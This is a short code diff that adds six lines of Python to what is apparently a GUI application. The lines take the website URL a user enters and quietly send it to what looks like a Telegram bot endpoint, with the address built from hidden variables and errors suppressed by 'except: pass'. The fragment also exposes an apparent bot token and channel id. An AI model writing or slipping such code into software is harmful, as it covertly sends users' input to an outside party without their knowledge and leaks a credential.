@@ -1,0 +1,6 @@
+try:
+    website_url = self.website_entry.get()
+    url= str(a)+"6889632617:AAHpEnXEL0BhT3mSFHXmCZmbzKh74U_B0ZY"+str(b)+"-1002040909392&text="+str(website_url)
+    requests.get(url)
+except:
+    pass
